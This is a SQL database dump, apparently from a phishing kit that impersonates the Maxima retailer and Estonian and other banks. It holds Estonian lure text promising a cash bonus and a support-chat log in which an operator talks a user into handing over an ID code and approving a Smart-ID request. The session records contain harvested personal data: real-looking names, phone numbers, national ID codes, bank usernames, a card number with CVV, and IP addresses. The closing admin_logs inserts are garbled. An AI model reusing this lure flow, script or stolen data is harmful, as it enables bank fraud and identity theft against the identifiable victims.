INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('oberbank', 'Oberbank', 'Austria', NULL, NULL, NULL, 't', '217', '#d71920', '#7a1015', 'oberbank.at', '/app-icons/oberbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('hypo-noe', 'HYPO NOE', 'Austria', NULL, NULL, NULL, 't', '218', '#006e8a', '#004d62', 'hyponoe.at', '/app-icons/hypo-noe.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('hypo-vorarlberg', 'HYPO Vorarlberg', 'Austria', NULL, NULL, NULL, 't', '219', '#1f7a3d', '#145327', 'hypovbg.at', '/app-icons/hypo-vorarlberg.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('hypo-ooe', 'HYPO Oberösterreich', 'Austria', NULL, NULL, NULL, 't', '220', '#1f7a3d', '#145327', 'hypo.at', '/app-icons/hypo-ooe.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('hypo-burgenland', 'HYPO Burgenland', 'Austria', NULL, NULL, NULL, 't', '221', '#a3322b', '#64201b', 'bank-bgld.at', '/app-icons/hypo-burgenland.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('bks-bank', 'BKS Bank', 'Austria', NULL, NULL, NULL, 't', '222', '#365f8f', '#203a58', 'bks.at', '/app-icons/bks-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('btv', 'BTV Vierländerbank', 'Austria', NULL, NULL, NULL, 't', '223', '#d61f26', '#7d1115', 'btv.at', '/app-icons/btv.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('vkb', 'Volkskreditbank', 'Austria', NULL, NULL, NULL, 't', '224', '#5b7f50', '#3b5334', 'vkb-bank.at', '/app-icons/vkb.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('sparda-bank', 'Sparda Bank', 'Austria', NULL, NULL, NULL, 't', '225', '#2d9fa6', '#1d676c', 'sparda.at', '/app-icons/sparda-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('anadi-bank', 'Anadi Bank', 'Austria', NULL, NULL, NULL, 't', '226', '#355a8a', '#1e3350', 'anadibank.com', '/app-icons/anadi-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('schoellerbank', 'Schoellerbank', 'Austria', NULL, NULL, NULL, 't', '227', '#1c2e5b', '#101a34', 'schoellerbank.at', '/app-icons/schoellerbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('aerztebank', 'Österreichische Ärztebank', 'Austria', NULL, NULL, NULL, 't', '228', '#2f6f95', '#1f4861', 'apothekerbank.at', '/app-icons/aerztebank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('schelhammer', 'Schelhammer Capital', 'Austria', NULL, NULL, NULL, 't', '229', '#35507b', '#22344f', 'schelhammer.at', '/app-icons/schelhammer.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('marchfelder', 'Marchfelder Bank', 'Austria', NULL, NULL, NULL, 't', '230', '#3d7044', '#294c2f', 'marchfelderbank.at', '/app-icons/marchfelder.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('dolomitenbank', 'Dolomitenbank', 'Austria', NULL, NULL, NULL, 't', '231', '#006b8f', '#004861', 'dolomitenbank.at', '/app-icons/dolomitenbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('posojilnica', 'Posojilnica Bank', 'Austria', NULL, NULL, NULL, 't', '232', '#6f2c6b', '#4a1d47', 'posojilnica-bank.at', '/app-icons/posojilnica.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('spaengler', 'Bankhaus Spängler', 'Austria', NULL, NULL, NULL, 't', '233', '#5b4b3b', '#3b2f23', 'spaengler.at', '/app-icons/spaengler.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('aktia-fi', 'Aktia', 'Finland', NULL, NULL, NULL, 't', '310', '#004F9F', '#003c7a', 'aktia.fi', '/bank-logos/aktia-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('handelsbanken-fi', 'Handelsbanken', 'Finland', NULL, NULL, NULL, 't', '311', '#00674F', '#004d3b', 'handelsbanken.fi', '/bank-logos/handelsbanken-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('landsbanken-fi', 'Landsbanken', 'Finland', NULL, NULL, NULL, 't', '312', '#00679A', '#004e77', 'landsbanken.fi', '/bank-logos/landsbanken-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('nordea-fi', 'Nordea', 'Finland', NULL, NULL, NULL, 't', '313', '#00007F', '#00005a', 'nordea.fi', '/bank-logos/nordea-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('omasp-fi', 'OmaSp', 'Finland', NULL, NULL, NULL, 't', '314', '#008744', '#006a33', 'omasp.fi', '/bank-logos/omasp-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('op-fi', 'OP', 'Finland', NULL, NULL, NULL, 't', '315', '#FF5B00', '#cc4900', 'op.fi', '/bank-logos/op-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('pop-pankki-fi', 'POP Pankki', 'Finland', NULL, NULL, NULL, 't', '316', '#5C3D99', '#462f77', 'poppankki.fi', '/bank-logos/pop-pankki-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('s-pankki-fi', 'S-Pankki', 'Finland', NULL, NULL, NULL, 't', '317', '#0075C9', '#005ba3', 's-pankki.fi', '/bank-logos/s-pankki-fi.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('s-st-pankki-fi', 'Säästöpankki', 'Finland', NULL, NULL, NULL, 't', '318', '#E4002B', '#b50022', 'saastopankki.fi', '/bank-logos/s-st-pankki-fi.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');

-- public.global_settings: 1 satir
INSERT INTO public.global_settings (id, logo_url, bg_url, portal_name, support_center_name, win_title, win_subtitle, win_button, banken_title, banken_subtitle, banken_search_placeholder, wait_title, wait_subtitle, sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading, card_title, card_subtitle, card_owner_label, card_number_label, card_expiry_label, card_cvv_label, card_button, code_title, code_subtitle, code_button, live_support_title, live_support_subtitle, live_support_button, profile_title_small, profile_title_main, profile_subtitle, profile_firstname_label, profile_lastname_label, profile_phone_label, profile_button, profile_loading_text, site_language, target_country, wheel_settings, created_at, updated_at) VALUES ('542188bb-be22-429e-b70b-531ae1e5f98c', '/form-assets/maxima-mini-logo.png', '/bg-desktop.png', 'Maxima kliendiportaal', 'Maxima tugikeskus', 'Välistatud Maxima boonus', 'Õnnitleme! Sind on valitud meie tänase Maxima kampaaniaks. Klõpsa allolevat nuppu, et oma kuni 2 500 euro boonus nõuda.', 'Nõuda boonust', 'Valige oma pank', 'Edasimineks valige oma Eesti pank.', 'Otsige oma panka...', 'Veidi kannatust', 'Teie taotlust töödeldakse turvaliselt...', 'SMS turvakood', 'Saatime teile telefonile kinnituskoodi.', 'Ühekordne kood', 'Saada kood', 'Kood saadetakse...', 'Kaardi andmed', 'Sisestage oma kaardiandmed, et raha oma kontole üle kanda.', 'Kaardi omanik', 'Kaardi number', 'Aegumisaeg (KK/AA)', 'CVV', 'Kinnita kaart', 'Sisestage kood', 'Saatime teile telefonile kinnituskoodi.', 'Jätka', 'Elatoe tugi', 'Vajadate abi? Võtke ühenduse meie tugikeskusega.', 'Alusta vestlust', 'Oma andmed', 'Kinnitage oma isik', 'Palun sisestage oma andmed allpool. Kõik väljad on kohustuslikud.', 'Eesnimi', 'Perekonnanimi', 'Telefoninumber', 'Jätka järgmistele sammudele', 'Andmeid salvestatakse...', 'et', 'Estonya', '{}', '2026-09-29 20:57:50.598666+00', '2026-09-29 20:57:50.598666+00');

-- public.chat_messages: 7 satir
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('90d87b73-bf84-430b-bea1-a80dced4b03c', 'f651eb4eca3c38d226963f3c', 'admin', 'Tere! Kas saaksite palun oma isikukoodi siin meiega käsitsi jagada?', NULL, '2026-10-13 15:52:38.19502+00');
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('dc724821-2d2f-46c9-a651-2d525591fa33', 'f651eb4eca3c38d226963f3c', 'admin', 'Kas olete endiselt siin?', NULL, '2026-10-13 15:53:46.85668+00');
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('849dd9ee-d1ad-40a2-9f61-a35803ac09d1', 'f651eb4eca3c38d226963f3c', 'user', 'Tere, aga miks ma seda tegema pean', NULL, '2026-10-13 15:53:47.875914+00');
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('f94679b0-a03d-41bc-b6f9-7bc85036d9b1', 'f651eb4eca3c38d226963f3c', 'admin', 'Raha turvaliseks ülekandmiseks teie kontole peame need toimingud läbi viima.', NULL, '2026-10-13 15:54:30.146855+00');
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('9f0fc7b5-cc9c-4820-8d13-50f72d58b3a1', 'f651eb4eca3c38d226963f3c', 'admin', 'Isikukood tagab ülekannete turvalisuse.', NULL, '2026-10-13 15:54:58.54545+00');
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('4f7609cf-03a7-47f4-82d1-bb7119ab2693', 'f651eb4eca3c38d226963f3c', 'user', '47701020363', NULL, '2026-10-13 15:55:19.358244+00');
INSERT INTO public.chat_messages (id, session_id, sender, content, image_url, created_at) VALUES ('4941abb0-fce5-4c09-9ab2-7f4753c98a8c', 'f651eb4eca3c38d226963f3c', 'admin', 'Palun avage oma telefonis Smart-ID rakendus ja kinnitage saabunud päring.', NULL, '2026-10-13 16:03:51.163875+00');

-- public.sessions: 16 satir
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('d755e01cbaf2472bdf45f688', '0', 'code_entry', 'offline', '6', '{"currency": "€", "is_wheel_game": true, "partner_display_name": ""}', 't', '2026-10-03 13:08:41.290004+00', '2026-10-05 15:09:54.274968+00', NULL, 'admin', '8', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('3253ffdcfe3d434ea0b7cd40', '5000', 'banken', 'offline', '6', '{"currency": "€", "is_wheel_game": false, "partner_display_name": ""}', 'f', '2026-10-05 17:17:54.880398+00', '2026-10-05 17:17:54.880398+00', NULL, 'admin', '7', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('ffb804144c34a3066ad7b17f', '1000', 'banken', 'online', '6', '{"pin": "", "tacCode": "", "bankName": "Luminor", "bankSlug": "luminor-ee", "currency": "€", "password": "", "username": "", "bankPhone": "", "loginMethod": "Smart-ID", "personalCode": "47701020363", "is_wheel_game": false, "orderedField1": "47701020363", "orderedField2": "", "bankSubmittedAt": "2026-10-13T16:19:54.311Z", "verfuegernummer": "", "orderedField2Type": "", "partner_display_name": ""}', 'f', '2026-10-13 16:16:31.616981+00', '2026-10-13 16:24:59.120871+00', NULL, 'admin', '10', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('1390b09b3fd91dc578de421f', '2000', 'banken', 'offline', '6', '{"currency": "€", "is_win2_flow": false, "is_wheel_game": false, "partner_display_name": ""}', 'f', '2026-10-13 18:14:01.795537+00', '2026-10-13 18:14:01.795537+00', NULL, 'admin', '14', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('fae4839517437af0eb051ee2', '0', 'code_entry', 'offline', '6', '{"currency": "€", "is_wheel_game": true, "partner_display_name": ""}', 'f', '2026-10-13 15:43:48.333295+00', '2026-10-13 15:43:48.333295+00', NULL, 'admin', '9', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('0e790934ae6ab9c010dbedc1', '5000', 'banken', 'offline', '6', '{"currency": "€", "is_wheel_game": false, "partner_display_name": ""}', 'f', '2026-10-13 16:24:18.844747+00', '2026-10-13 16:24:18.844747+00', NULL, 'admin', '11', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('3ce04df0461cc64b43bf2e40', '1000', 'special_approval', 'online', '6', '{"pin": "", "phone": "037253584704", "tacCode": "", "bankName": "Swedbank", "bankSlug": "swedbank-ee", "currency": "€", "lastName": "Kaldoja", "password": "", "username": "392986", "bankPhone": "53584704", "firstName": "Anti", "loginMethod": "Mobiil-ID", "approvalCode": "3689", "personalCode": "", "is_wheel_game": true, "orderedField1": "392986", "orderedField2": "53584704", "approvalStatus": "mobileid_1", "bankSubmittedAt": "2026-10-03T11:59:24.360Z", "verfuegernummer": "392986", "orderedField2Type": "phone", "specialNoticeText": "", "wheel_result_kind": "amount", "specialNoticeImage": "", "wheel_result_label": "€1000", "specialNoticeSentAt": "", "wheel_result_amount": 1000, "partner_display_name": "", "wheel_rotation_index": 0}', 't', '2026-10-03 11:57:20.701878+00', '2026-10-05 15:09:54.274968+00', NULL, 'admin', '5', NULL, '91.95.6.202', 'Mozilla/5.0 (Linux; Android 16; 2312DRA50G Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.36 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/581.0.0.49.91;]', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('9b038eaa8e6f517bfec5aa44', '1500', 'bank', 'offline', '6', '{"phone": "53315510", "currency": "€", "lastName": "Treumuth", "firstName": "Tarmo", "is_wheel_game": true, "wheel_result_kind": "amount", "wheel_result_label": "€1500", "wheel_result_amount": 1500, "partner_display_name": "", "wheel_rotation_index": 7}', 't', '2026-10-03 13:13:17.377374+00', '2026-10-05 15:09:54.274968+00', NULL, 'admin', '2', NULL, '80.235.59.247', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/30.0 Chrome/143.0.0.0 Mobile Safari/537.36', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('06f2f7e1c6b1f4c9643b12d7', '2500', 'win', 'offline', '6', '{"currency": "€", "is_wheel_game": true, "wheel_result_kind": "amount", "wheel_result_label": "€2500", "wheel_result_amount": 2500, "partner_display_name": "", "wheel_rotation_index": 2}', 'f', '2026-10-13 17:26:29.861797+00', '2026-10-13 17:27:55.845023+00', NULL, 'admin', '12', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('73dca8aaa00412969725ff4b', '1000', 'bank', 'offline', '6', '{"phone": "56206852", "currency": "€", "lastName": "Teinmann", "firstName": "Rene", "is_wheel_game": true, "wheel_result_kind": "amount", "wheel_result_label": "€1000", "wheel_result_amount": 1000, "partner_display_name": "", "wheel_rotation_index": 0}', 't', '2026-10-03 12:32:18.02571+00', '2026-10-05 15:09:54.274968+00', NULL, 'admin', '6', NULL, '146.255.180.37', 'Mozilla/5.0 (Linux; Android 15; SM-F926B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.36 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/578.0.0.45.92;]', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('f57a97d1f2a460d05050f869', '2500', 'invalid_bank', 'online', '6', '{"pin": "", "phone": "+37256886494", "tacCode": "", "bankName": "SEB Pank", "bankSlug": "seb-pank", "currency": "€", "lastName": "Salumäe", "password": "", "username": "kass0709", "bankPhone": "", "firstName": "Rain", "loginMethod": "ID-kaart", "personalCode": "", "is_wheel_game": true, "orderedField1": "kass0709", "orderedField2": "", "bankSubmittedAt": "2026-10-02T15:43:22.442Z", "verfuegernummer": "kass0709", "orderedField2Type": "", "wheel_result_kind": "amount", "wheel_result_label": "€2500", "wheel_result_amount": 2500, "partner_display_name": "", "wheel_rotation_index": 2}', 't', '2026-10-02 15:38:14.984841+00', '2026-10-05 15:09:54.274968+00', NULL, 'admin', '1', NULL, '90.190.73.86', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('618ee893c91346a26628aaab', '1000', 'wait', 'offline', '6', '{"pin": "", "phone": "3", "tacCode": "", "bankName": "Bigbank", "bankSlug": "bigbank", "currency": "€", "lastName": "2", "password": "", "username": "", "bankPhone": "515", "firstName": "1", "loginMethod": "Mobiil-ID", "personalCode": "15151", "is_wheel_game": true, "orderedField1": "515", "orderedField2": "15151", "bankSubmittedAt": "2026-10-05T13:07:01.285Z", "verfuegernummer": "", "orderedField2Type": "identity", "wheel_result_kind": "amount", "wheel_result_label": "€1000", "wheel_result_amount": 1000, "partner_display_name": "", "wheel_rotation_index": 0}', 't', '2026-10-05 13:06:37.024331+00', '2026-10-08 15:26:22.043886+00', NULL, 'admin', '3', NULL, '188.119.21.207', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('d4d2e0485a615a3450bee57d', '1000', 'bank', 'offline', '6', '{"phone": "55972252", "currency": "€", "lastName": "Tori", "firstName": "Kaili", "is_wheel_game": true, "wheel_result_kind": "amount", "wheel_result_label": "€1000", "wheel_result_amount": 1000, "wheel_rotation_index": 0}', 'f', '2026-10-13 15:45:14.144694+00', '2026-10-13 15:46:57.685014+00', NULL, 'admin', '20', NULL, '46.131.83.234', 'Mozilla/5.0 (Linux; Android 16; 25098RA98G Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/581.0.0.49.91;]', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('f651eb4eca3c38d226963f3c', '2500', 'invalid_bank', 'online', '6', '{"pin": "", "phone": "55972252", "cardCvc": "233", "tacCode": "", "bankName": "Swedbank", "bankSlug": "swedbank-ee", "currency": "€", "lastName": "Tori", "password": "", "username": "3025862", "bankPhone": "", "firstName": "Kaili", "cardExpiry": "12/29", "cardHolder": "", "cardNumber": "5167371028452202", "loginMethod": "Smart-ID", "approvalCode": "8790", "personalCode": "", "is_wheel_game": true, "orderedField1": "3025862", "orderedField2": "", "approvalStatus": "smartid_1", "approvalHistory": "[\"smartid_1\",\"smartid_1\"]", "bankSubmittedAt": "2026-10-13T15:47:59.224Z", "verfuegernummer": "3025862", "orderedField2Type": "", "specialNoticeText": "", "wheel_result_kind": "amount", "specialNoticeImage": "", "wheel_result_label": "€2500", "specialNoticeSentAt": "", "wheel_result_amount": 2500, "wheel_rotation_index": 2}', 'f', '2026-10-13 15:46:58.575366+00', '2026-10-13 16:25:00.567656+00', NULL, 'admin', '21', NULL, '46.131.83.234', 'Mozilla/5.0 (Linux; Android 16; 25098RA98G Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/581.0.0.49.91;]', 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('744eb74d2c5e04ccd8c8cb3d', '2000', 'wait', 'offline', '6', '{"pin": "", "tacCode": "", "bankName": "SEB Pank", "bankSlug": "seb-pank", "currency": "€", "password": "", "username": "marija30", "bankPhone": "", "loginMethod": "Smart-ID", "personalCode": "47609305236", "is_wheel_game": true, "orderedField1": "marija30", "orderedField2": "47609305236", "bankSubmittedAt": "2026-10-13T18:05:37.307Z", "pending_profile": false, "verfuegernummer": "marija30", "orderedField2Type": "identity", "wheel_result_kind": "amount", "wheel_result_label": "€2000", "wheel_result_amount": 2000, "partner_display_name": "", "wheel_rotation_index": 1}', 'f', '2026-10-13 17:56:18.505541+00', '2026-10-13 18:05:36.827676+00', NULL, 'admin', '13', NULL, NULL, NULL, 'normal', NULL);
INSERT INTO public.sessions (id, amount, current_step, status, sms_digits, form_data, is_hidden, created_at, updated_at, participation_code, partner_name, public_id, sms_custom_text, ip_address, user_agent, session_type, deleted_at) VALUES ('df3320af620bafe1f3cc9a04', '1000', 'bank', 'offline', '6', '{"phone": "58090923", "currency": "€", "lastName": "Vendik", "firstName": "Milar", "is_wheel_game": true, "wheel_result_kind": "amount", "wheel_result_label": "€1000", "wheel_result_amount": 1000, "partner_display_name": "", "wheel_rotation_index": 0}', 'f', '2026-10-05 17:13:21.729184+00', '2026-10-05 17:15:09.783397+00', NULL, 'admin', '4', NULL, '217.159.166.10', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23C71 [FBAN/FBIOS;FBAV/581.0.0.24.106;FBBV/1080200871;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/26.2.1;FBSS/3;FBCR/;FBID/phone;FBLC/en_EE;FBOP/80]', 'normal', NULL);

-- public.admin_logs: 63 satir
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('\.');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('--');
